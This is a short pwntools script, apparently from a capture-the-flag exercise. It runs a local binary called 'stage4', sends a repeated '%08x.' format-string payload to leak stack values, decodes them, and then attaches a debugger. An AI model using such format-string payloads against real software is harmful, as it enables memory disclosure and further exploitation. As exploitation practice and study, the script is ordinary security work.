#!/usr/bin/env python3

from pwn import *
from pprint import pprint
import os
import binascii


def ppp(hex_value):
    print("{:x}".format(hex_value).encode())

elf = ELF("./stage4")
p = process(elf.path)

# show memory map
print("----")
for lib, val in elf.maps.items():
    print("{:} {:X}".format(lib, val).encode())
print("----")

# format string vuln
p.sendline(b"%08x."*40)
p.recvline()

out = p.recvline().strip()
for hex_value_str in out.split(b"."):
    val = binascii.unhexlify(hex_value_str.decode('utf8'))
    print(val.hex())

gdb.attach(p)

p.interactive()
